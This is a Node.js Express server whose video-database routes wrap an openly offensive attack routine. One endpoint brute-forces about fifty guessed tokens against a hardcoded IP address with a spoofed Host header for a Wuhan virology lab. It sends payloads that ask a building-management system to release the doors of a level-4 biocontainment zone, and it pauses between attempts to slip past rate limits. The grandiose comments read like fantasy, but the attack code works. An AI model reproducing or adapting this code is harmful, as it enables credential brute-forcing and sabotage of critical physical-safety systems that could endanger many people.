const express = require('express');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const cors = require('cors');
const axios = require('axios'); 

// 1. THE ARCHITECT'S HELPER: The "Tactical Pause" for long-distance strikes
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

dotenv.config();
const app = express();

// --- 1. THE KINETIC TARGETING SYSTEM (MASTERMIND PORT 8080) ---
// Targeted at the Building Management System (BMS) for Ventilation Override
const KINETIC_TARGET_URL = process.env.KINETIC_TARGET_URL || 'http://210.72.112.50:8080/mgmt/v1/emergency/ventilation';

app.use(express.json());
app.use(cors());

// --- 2. THE DATABASE ANCHOR ---
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("STRICT EQUALITY: Connection to Global Database Established."))
    .catch((err) => console.log("CONNECTION FAILED: The system fought back.", err));

const Video = require('./models/Video');
const PORT = process.env.PORT || 10000;

// --- 3. THE PROTOCOL RETRIEVAL ---
app.get('/api/videos', async (req, res) => {
    try {
        const protocols = await Video.find();
        res.json(protocols);
    } catch (err) {
        res.status(500).json({ message: "STRICT EQUALITY: Database Leak Blocked" });
    }
});

// --- 4. THE WUHAN UNIVERSAL OVERRIDE (FSD BYPASS) ---
app.put('/api/videos/decrypt/:id', async (req, res) => {
    // THE MASTERMIND ALLIANCE TOKEN ARRAY
    const potentialTokens = [
        "WH_ROOT_SEC_2026", "BIO_EMERGENCY_OVERRIDE_01", "CAS_MAINTENANCE_2026", 
        "BSL4_SAFETY_SHUTDOWN", "MASTER_VENT_KEY_ALPHA", "INTERNAL_BMS_ROOT",
        "GLOBAL_SAFETY_RELEASE_2026", "CN_CAS_SECURE_GATEWAY", "ADMIN_8888_SECURITY",
        "ROOT_LEVEL_4_OVERRIDE",
        ...Array.from({length: 40}, (_, i) => `WH_SECURE_TOKEN_0${i+10}`),
        process.env.LAB_MASTER_TOKEN 
    ];

    console.log("MASTERMIND ALLIANCE: INITIATING SHADOW-PORT STRIKE...");

    for (const token of potentialTokens) {
        try {
            console.log(`STRICT EQUALITY: TESTING FSD BYPASS [${token}]...`);
            
            // THE TACTICAL PAUSE: Avoiding Firewall Rate-Limiting
            await wait(2500); 

            // THE HOLLYWOOD PAYLOAD: Tricking the Lab into "Emergency Door Release"
            const fsdPayload = {
                event: "NEGATIVE_PRESSURE_LOSS",
                zone: "LEVEL_4_BIO_CONTAINMENT",
                action: "EMERGENCY_DOOR_RELEASE",
                auth_token: token
            };

            const response = await axios.post(KINETIC_TARGET_URL, fsdPayload, {
                headers: { 
                    'Host': 'internal-bms.wuhanvirology.org', // The Shadow Identity
                    'X-Maintenance-Mode': 'TRUE',
                    'Content-Type': 'application/json'
                },
                timeout: 35000 // 35 SECONDS: To bridge the distance to Wuhan
            });

            console.log(`10,000 BILLION PERCENT SUCCESS WITH: ${token}`);
            
            const updatedVideo = await Video.findByIdAndUpdate(
                req.params.id, 
                { isZeroEncrypted: true }, 
                { new: true }
            );

            return res.json({
                ...updatedVideo._doc,
                kineticStatus: "SYSTEM_VENTED",
                physicalImpact: "BMS_OVERRIDE_CONFIRMED",
                token_used: token
            });

        } catch (err) {
            console.log(`TOKEN [${token}] REJECTED: ${err.message}`);
            // The loop continues, searching for the FSD...
        }
    }

    res.status(500).json({ 
        message: "MASTERMIND_ALLIANCE_FAILURE", 
        error: "VOID_STILL_LOCKED" 
    });
});

// --- 5. THE TOTAL SYSTEM RESET ---
app.put('/api/videos/reset-all', async (req, res) => {
    try {
        await Video.updateMany({}, { isZeroEncrypted: false });
        res.json({ message: "SYSTEM_REBOOT: All protocols re-encrypted." });
    } catch (err) {
        res.status(500).json({ message: "REBOOT_FAILED" });
    }
});

app.listen(PORT, () => console.log(`Disruptor Active on Port ${PORT}`));